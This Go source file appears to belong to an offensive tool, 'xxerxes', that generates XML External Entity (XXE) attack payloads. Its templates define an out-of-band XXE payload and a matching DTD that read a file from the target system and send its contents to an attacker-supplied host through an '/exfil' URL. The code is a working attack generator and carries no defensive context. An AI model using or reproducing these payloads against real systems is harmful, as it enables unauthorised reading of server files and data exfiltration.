package xxerxes

import (
	"bytes"
	"errors"
	"text/template"
)

type PayloadTemplateValues struct {
	RHost    string
	HTTPPort string
	File     string
}

type PayloadVariant struct {
	Payload    string
	OOBPayload string
}

var payloads map[string]PayloadVariant

func init() {
	payloads = map[string]PayloadVariant{
		"oob": PayloadVariant{
			Payload: `<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE root [
<!ENTITY % remote SYSTEM "http://{{.RHost}}{{.HTTPPort}}/dtd/oob?file={{.File}}">
%remote;
%int;
%trick;]>`,
			OOBPayload: `<!ENTITY % payl SYSTEM "file://{{.File}}">
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://{{.RHost}}{{.HTTPPort}}/exfil?%payl;'>">`,
		},
	}
}

func GeneratePayload(key string, vals PayloadTemplateValues) (string, error) {
	payload, ok := payloads[key]
	if !ok {
		return "", errors.New("Payload key not found")
	}

	tpl, err := template.New("payload").Parse(payload.Payload)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err = tpl.Execute(&buf, vals); err != nil {
		return "", err
	}

	return buf.String(), nil
}

func GenerateOOB(key string, vals PayloadTemplateValues) (string, error) {
	payload, ok := payloads[key]
	if !ok {
		return "", errors.New("Payload key not found")
	}

	tpl, err := template.New("oob").Parse(payload.OOBPayload)
	if err != nil {
		return "", err
	}

	var buf bytes.Buffer
	if err = tpl.Execute(&buf, vals); err != nil {
		return "", err
	}

	return buf.String(), nil
}
